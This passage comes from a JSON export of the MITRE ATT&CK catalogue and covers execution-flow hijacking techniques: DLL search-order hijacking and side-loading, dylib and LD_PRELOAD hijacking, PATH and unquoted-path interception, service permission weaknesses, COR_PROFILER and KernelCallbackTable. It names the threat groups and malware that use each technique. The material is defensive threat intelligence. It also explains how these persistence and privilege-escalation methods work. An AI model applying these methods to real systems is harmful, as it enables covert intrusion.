DUSTTRAP."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used DLL search-order hijacking to load exe, dll, and dat files into memory. Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can launch itself via DLL Search Order Hijacking."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has executed DLL search order hijacking."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used search order hijacking to load a malicious DLL."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit various DLL hijacking opportunities."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder."}, {"id": "S0182", "name": "FinFisher", "description": "A FinFisher variant uses DLL search order hijacking."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate version.dll during the Microsoft.IdentityServer.ServiceHost.exe execution process."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has used DLL Search Order Hijacking to load oci.dll as a persistence mechanism."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll."}, {"id": "S1097", "name": "HUI Loader", "description": "HUI Loader can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can use DLL hijacking to bypass security controls."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL search order hijacking."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has the ability to use DLL search order hijacking for installation on targeted systems."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll."}, {"id": "G0048", "name": "RTM", "description": "RTM has used search order hijacking to force TeamViewer to load a malicious DLL."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has performed DLL search order hijacking to execute their payload."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has performed DLL hijacking before execution."}, {"id": "S0109", "name": "WEBC2", "description": "Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll)."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used search order hijacking to run the loader Vcrodat."}]}, {"name": "DLL Side-Loading", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).", "detailed_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "id": "T1574.002", "examples": [{"id": "G0073", "name": "APT19", "description": "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools."}, {"id": "G0050", "name": "APT32", "description": "APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used legitimate executables to perform DLL side-loading of their malware."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable."}, {"id": "S0127", "name": "BBSRAT", "description": "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used legitimate applications to side-load malicious DLLs."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used side loading to place malicious DLLs in memory."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy can use a digitally signed binary (\"Logitech Bluetooth Wizard Host Process\") to load its dll into memory."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has abused legitimate executables to side-load weaponized DLLs."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can store a file named mpsvc.dll, which opens a malicious mpsvc.mui file, in the same folder as the legitimate Microsoft executable MsMpEng.exe to gain execution."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems. Daggerfly is also linked to multiple other instances of side-loading for initial loading activity."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate includes one infection vector that leverages a malicious \"KeyScramblerE.DLL\" library that will load during the execution of the legitimate KeyScrambler application."}, {"id": "S0354", "name": "Denis", "description": "Denis exploits a security vulnerability to load a fake DLL and execute its code."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can abuse legitimate Windows executables to side-load malicious DLL files."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has placed a malicious payload in %WINDIR%\\SYSTEM32\\oci.dll so it would be sideloaded by the MSDTC service."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used DLL side-loading to execute its payload."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507)."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher uses DLL side-loading to load malicious programs."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine."}, {"id": "S0032", "name": "gh0st RAT", "description": "A gh0st RAT variant has used DLL side-loading."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has used DLL side-loading."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload."}, {"id": "S0528", "name": "Javali", "description": "Javali can use DLL side-loading to load malicious DLLs into legitimate executables."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can use DLL side-loading to load malicious DLLs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe has been executed as a file named DsNcDiag.dll through side-loading."}, {"id": "S0582", "name": "LookBack", "description": "LookBack side loads its communications module as a DLL into the libcurl.dll loader."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can support an HKCMD sideloading start method."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has side-loaded its malicious DLL file."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used DLL side-loading to load malicious DLL's into legitimate executables."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use DLL side-loading to gain execution."}, {"id": "S1100", "name": "Ninja", "description": "Ninja loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can use DLL side-loading to execute malicious payloads."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has used DLL side-loading to evade anti-virus."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can side-load Goopdate.dll into GoogleUpdate.exe."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use DLL side-loading for execution."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use side-loading to run malicious executables."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can use legitimate, signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can be installed via DLL side-loading."}, {"id": "S0074", "name": "Sakula", "description": "Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can load DLLs through vulnerable legitimate executables."}, {"id": "S0098", "name": "T9000", "description": "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has used DLL side loading to import and load a malicious DLL loader."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has used DLL side-loading to load malicious payloads."}]}, {"name": "Dylib Hijacking", "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.", "detailed_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1574.004", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application."}]}, {"name": "Executable Installer File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.  If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.005", "examples": []}, {"name": "Dynamic Linker Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s os.environ.\nOn Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.", "id": "T1574.006", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has configured payloads to load via LD_PRELOAD."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so, then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence."}, {"id": "S0377", "name": "Ebury", "description": "When Ebury is running as an OpenSSH server, it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions. Ebury hooks the following functions from libc to inject into subprocesses;  system, popen, execve, execvpe, execv, execvp, and execl."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has modified /etc/ld.so.preload to intercept shared library import functions."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code."}]}, {"name": "Path Interception by PATH Environment Variable", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in C:\\example path, which by default precedes C:\\Windows\\system32\\net.exe in the PATH environment variable, when \"net\" is executed from the command-line the C:\\example path will be called instead of the system's legitimate executable at C:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the $PATH variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the /etc/paths.d folder contents.", "id": "T1574.007", "examples": [{"id": "S1111", "name": "DarkGate", "description": "DarkGate overrides the %windir% environment variable by setting a Registry key, HKEY_CURRENT_User\\Environment\\windir, to an alternate command to execute a malicious AutoIt script. This allows DarkGate to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\\system32\\cleanmgr.exe for execution."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable."}]}, {"name": "Path Interception by Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.", "id": "T1574.008", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit search order hijacking vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities."}]}, {"name": "Path Interception by Unquoted Path", "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\").  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program.\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.", "id": "T1574.009", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit unquoted path vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities."}]}, {"name": "Services File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.010", "examples": [{"id": "S0089", "name": "BlackEnergy", "description": "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."}]}, {"name": "Services Registry Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. ", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\nThe Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service\u2019s Registry tree to point to a malicious DLL.\nAdversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.", "id": "T1574.011", "examples": [{"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process."}]}, {"name": "COR_PROFILER", "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.", "detailed_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.", "id": "T1574.012", "examples": [{"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active."}]}, {"name": "KernelCallbackTable", "description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.", "detailed_description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.\nAn adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\nA pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest 